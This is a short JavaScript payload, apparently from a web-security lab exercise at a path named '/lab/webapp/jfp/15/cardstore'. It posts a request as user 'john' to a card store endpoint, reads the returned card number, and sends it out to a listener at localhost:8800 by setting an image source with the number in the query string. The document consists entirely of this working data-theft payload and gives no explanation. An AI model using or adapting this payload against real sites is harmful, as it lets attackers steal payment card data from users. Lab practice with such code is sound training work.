var req = new XMLHttpRequest();
req.onreadystatechange = function(){
  if(req.readyState == 4 && req.status == 200){
    alert(req.responseText);
    new Image().src = "http://localhost:8800/?cardno="+req.responseText;
  }
}
req.open("POST","/lab/webapp/jfp/15/cardstore",true);
req.setRequestHeader('Content-type','application/x-www-form-urlencoded');
req.send("user=john");
